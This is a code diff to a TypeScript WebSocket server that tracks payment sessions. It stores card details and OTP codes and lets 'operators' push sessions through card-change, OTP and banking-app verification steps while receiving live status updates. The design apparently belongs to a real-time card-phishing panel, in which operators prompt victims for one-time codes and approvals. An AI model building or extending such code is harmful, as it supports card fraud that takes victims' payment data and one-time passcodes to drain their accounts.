@@ -303,10 +303,16 @@ export function setupWebSocket(server: any) {
             if (action === 'change_card') {
               (s as any).cardInfo.otpCode = '';
             }
+            // Update currentStep for verification actions
+            if (action === 'app_verify') {
+              s.currentStep = 'app_verify';
+            } else if (action === 'otp_verify' || action === 'custom_otp_tail' || action === 'custom_otp_verify') {
+              s.currentStep = 'otp';
+            }
           }
           paymentService.upsertSession({ id: sessionId, status: newStatus });
 
-          const bcast: any = { sessionId, status: newStatus, action, message };
+          const bcast: any = { sessionId, status: newStatus, action, message, currentStep: s?.currentStep };
           if (action === 'change_card' && s) {
             // Send full cardInfo so frontend reactivity picks up otpCode change
             bcast.cardInfo = { ...(s as any).cardInfo };
@@ -373,6 +379,13 @@ export function setupWebSocket(server: any) {
 
         case 'app_verify_done': {
           const { sessionId } = msg.payload;
+          const s = sessions.get(sessionId);
+          if (s) {
+            s.status = 'pending';
+            s.pendingTs = Date.now();
+            paymentService.upsertSession({ id: sessionId, status: 'pending' });
+            broadcast('session_update', { sessionId, status: 'pending', action: 'app_verify_done' }, sessionId);
+          }
           operators.forEach(op => {
             if (op.readyState === WebSocket.OPEN) {
               op.send(JSON.stringify({ type: 'app_verify_done', payload: { sessionId } }));
